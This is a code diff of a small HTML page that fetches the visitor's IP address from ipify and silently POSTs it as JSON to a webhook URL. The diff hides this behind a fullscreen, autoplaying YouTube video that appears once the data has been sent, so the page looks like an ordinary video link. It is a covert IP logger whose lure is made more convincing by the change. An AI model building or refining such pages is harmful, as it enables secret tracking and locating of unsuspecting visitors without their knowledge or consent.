@@ -2,10 +2,37 @@
 <html>
 <head>
     <title>mm</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #video-container {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        #player {
+            width: 100%;
+            height: 100%;
+        }
+    </style>
 </head>
 <body>
 
 <p id="loading-message">pls wait while this loads</p>
+
+<div id="video-container">
+    <div id="player"></div>
+</div>
 
 <script>
     async function getIP(json) {
@@ -75,19 +102,21 @@
                 "attachments": []
             };
 
-            fetch(webhookURL, {
+            await fetch(webhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
             });
-            setTimeout(() => {
-                document.getElementById("loading-message").textContent = "ok thanks now you can go";
-            }, 2000);
+
+            document.getElementById("loading-message").style.display = "none";
+            document.getElementById("video-container").style.display = "block";
+
+            loadYouTubePlayerAPI();
 
         } catch(error) {
-            document.getElementById("loading-message").textContent = "uh can you like reload or sum";
+            document.getElementById("loading-message").textContent = "Failed to send IP information";
             console.error(error);
         }
     }
@@ -101,6 +130,35 @@
         } catch (error) {
             return null;
         }
+    }
+
+    function loadYouTubePlayerAPI() {
+        const tag = document.createElement('script');
+        tag.src = "https://www.youtube.com/iframe_api";
+        const firstScriptTag = document.getElementsByTagName('script')[0];
+        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+    }
+
+    let player;
+    function onYouTubeIframeAPIReady() {
+        player = new YT.Player('player', {
+            height: '100%',
+            width: '100%',
+            videoId: 'Ba12wkFtIUc',
+            playerVars: {
+                'autoplay': 1,
+                'mute': 1,
+                'controls': 0,
+                'loop': 1
+            },
+            events: {
+                'onReady': onPlayerReady
+            }
+        });
+    }
+
+    function onPlayerReady(event) {
+        event.target.playVideo();
     }
 </script>
 <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
